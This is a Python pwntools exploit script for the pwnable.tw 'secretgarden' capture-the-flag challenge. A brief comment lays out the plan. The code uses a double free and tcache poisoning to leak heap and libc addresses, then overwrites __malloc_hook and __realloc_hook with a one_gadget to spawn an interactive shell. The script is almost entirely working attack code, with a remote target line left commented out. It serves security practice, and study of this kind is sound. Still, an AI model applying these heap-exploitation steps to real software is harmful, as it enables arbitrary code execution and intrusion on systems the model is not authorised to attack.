'''
libc.so.27
1.double free,tcachebin attack
2.realloc,malloc->malloc_hook(realloc)->realloc_hook(one_gadget)
step:
1.leak a heap address
2.leak a libc address(heap address-> a unsorted chunk
3. hijack realloc
struct：
chunk1
{ remove_flag; #0 or 1
  flower_name_ptr;
  color; # 3x8bytes
  }
chunk2 flower_name
'''

from pwn import *
context.log_level='debug'
#p=remote('chall.pwnable.tw',10203)
p=process('./secretgarden')
raw_input()
def raisef(len_name,name,color):
    p.recvuntil('choice : ')
    p.sendline('1')
    p.recvuntil('name :')
    p.sendline(str(len_name))
    p.recvuntil('flower :')
    p.sendline(name)
    p.recvuntil('flower :')
    p.sendline(color)
def visit():
    p.recvuntil('choice : ')
    p.sendline('2')
def remove(num):
    p.recvuntil('choice : ')
    p.sendline('3')
    p.recvuntil('garden:')
    p.sendline(str(num))
def clean():
    p.recvuntil('choice : ')
    p.sendline('4')
#leak a heap address
raisef(40,'aa','bb')#0
#visit()
raisef(40,'aa','bb')#1
remove(0)
remove(1)
remove(0)
raisef(50,'aa','bb')#2
name='a'*7
raisef(40,name,'bb')#3
visit()
p.recvuntil('flower[3] :aaaaaaa\n')
#flower2's name 
heap_addr=u64(p.recvn(6).ljust(8,'\x00'))
print("heap_addr=>0x%x"%heap_addr)
#tcachebins 0x1 remove all
#remove(2)
remove(3)
remove(2)
clean()
#0x5583c4a93300-> 0x5583c4a932a0-> 0x5583c4a932d0-> 0x5583c4a92260 <- 0x5583c4a932a0
#leak a libc address
raisef(0x50,'aa','bb')#0
#visit()
raisef(0x410,'aa','bb')#1
raisef(0x50,'aa','bb')#2
remove(1)
name='a'*8+p64(heap_addr+0xa0)
raisef(40,name,'bb')#3
visit()
p.recvuntil('flower[1] :')
#flower4's name 
libc_addr=u64(p.recvn(6).ljust(8,'\x00'))
print("libc_addr=>0x%x"%libc_addr)
#remove all
remove(3)
remove(2)
remove(0)
clean()

#___hook hijacking
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_base=libc_addr-0x3ebca0
print("libc_base=>0x%x"%libc_base)
raisef(0x50,'aa','bb')#0
malloc_hook=libc_base+libc.sym['__malloc_hook']
print("malloc_hook=>0x%x"%malloc_hook)
realloc=libc_base+libc.sym['__libc_realloc']
print("realloc=>0x%x"%realloc)
name=p64(malloc_hook-0x8)
raisef(40,name,'bb')#1
raisef(50,'aa','bb')#2
one_gadget=p64(0x4f322+libc_base)+p64(realloc+2)
raisef(40,one_gadget,'bb')#3
p.recvuntil('choice : ')
raw_input()
p.sendline('1')
p.interactive()
